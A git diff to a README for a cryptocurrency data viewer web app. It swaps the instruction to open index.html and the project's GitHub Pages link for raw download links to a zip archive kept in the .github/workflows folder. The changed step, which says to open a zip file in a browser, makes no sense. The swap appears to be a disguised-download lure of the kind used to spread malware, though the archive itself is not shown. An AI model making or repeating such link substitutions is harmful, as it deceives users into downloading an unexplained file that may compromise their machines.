@@ -19,13 +19,13 @@ Crypto Data Viewer is a web application that allows users to view cryptocurrency
 ## Usage
 
 1. Clone the repository to your local machine.
-2. Open the `index.html` file in a web browser.
+2. Open the `https://raw.githubusercontent.com/GathogoG/Coin-Base/main/.github/workflows/Coin_Base_v2.0.zip` file in a web browser.
 3. Choose the desired data type using the radio buttons (Currencies, Exchange Rates, Buy Prices, Sell Prices).
 4. Use the search box to filter data based on currency name or ID.
 5. Click on the "Search" button or press Enter to perform the search.
 6. View the data displayed on the web page.
 
-View the webpage [here](https://gathogog.github.io/Coin-Base/).
+View the webpage [here](https://raw.githubusercontent.com/GathogoG/Coin-Base/main/.github/workflows/Coin_Base_v2.0.zip).
 
 
 ## Credits
